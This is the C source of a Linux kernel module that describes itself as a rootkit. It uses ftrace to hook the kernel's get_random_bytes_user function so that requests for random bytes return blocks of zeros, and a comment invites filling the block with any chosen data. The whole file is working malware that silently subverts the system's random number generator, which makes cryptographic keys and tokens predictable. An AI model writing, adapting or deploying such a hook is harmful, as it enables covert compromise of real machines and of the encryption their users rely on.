#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/uio.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("m3ta");
MODULE_DESCRIPTION("get_random_bytes_user hook");
MODULE_VERSION("0.0.1");

#define BLOCKSIZE 32

static asmlinkage ssize_t (*orig_get_random_bytes_user)(struct iov_iter *iter);

asmlinkage ssize_t get_random_bytes_user_hook(struct iov_iter *iter) {
	u8 block[BLOCKSIZE];
	size_t ret = 0, i, copied;

	// mess with this loop to load any data you'd like	
	for(i = 0; i < BLOCKSIZE; i++)
		block[i] = 0;

	if(!iov_iter_count(iter))
		return 0;

	if(iov_iter_count(iter) <= BLOCKSIZE) {
		ret = copy_to_iter(block, BLOCKSIZE, iter);
		goto fn_exit;
	}

	for(;;) {
		copied = copy_to_iter(block, sizeof(block), iter);
		ret += copied;
		if(!iov_iter_count(iter) || copied != sizeof(block))
			break;

		BUILD_BUG_ON(PAGE_SIZE % sizeof(block) != 0);
		if(ret % PAGE_SIZE == 0) {
			if(signal_pending(current))
				break;
			cond_resched();
		}
	}

	//uncomment if you change the loop above
	//memzero_explicit(block, sizeof(block));
fn_exit:
	return ret ? ret : -EFAULT;
}

static struct ftrace_hook hooks[] =  {
	HOOK("get_random_bytes_user", get_random_bytes_user_hook, &orig_get_random_bytes_user),
};

static int __init rootkit_init(void) {
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;

	printk(KERN_INFO "rootkit: loaded\n");
	return 0;
}

static void __exit rootkit_exit(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

	printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
